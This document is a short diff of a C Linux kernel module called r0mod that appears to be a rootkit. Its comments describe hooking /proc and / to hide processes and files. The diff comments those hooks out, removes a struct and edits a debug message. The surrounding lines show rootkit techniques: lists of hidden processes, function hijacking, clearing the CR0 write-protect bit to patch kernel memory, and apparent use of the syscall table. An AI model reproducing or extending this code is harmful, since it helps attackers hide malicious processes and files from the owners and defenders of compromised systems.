@@ -59,12 +59,6 @@ struct s_file_args
     char *name;
 };
 
-struct s_args
-{
-    void *ptr;
-    unsigned short cmd;
-};
-
 struct hidden_proc {
     unsigned short pid;
     struct list_head list;
@@ -410,12 +404,12 @@ static int __init r0mod_init(void)
     }
 
     /* Hook /proc for hiding processes */
-    proc_iterate = get_vfs_iterate("/proc");
-    hijack_start(proc_iterate, &n_proc_iterate);
+    //proc_iterate = get_vfs_iterate("/proc");
+    //hijack_start(proc_iterate, &n_proc_iterate);
 
     /* Hook / for hiding files and directories */
-    root_iterate = get_vfs_iterate("/");
-    hijack_start(root_iterate, &n_root_iterate);
+    //root_iterate = get_vfs_iterate("/");
+    //hijack_start(root_iterate, &n_root_iterate);
 
     write_cr0(read_cr0() & (~0x10000));
 
@@ -430,7 +424,7 @@ static int __init r0mod_init(void)
 
 static void __exit r0mod_exit(void)
 {
-    DEBUG("Module ending...\n");
+    DEBUG("Module ending...!\n");
 
     if(sct != NULL)
     {
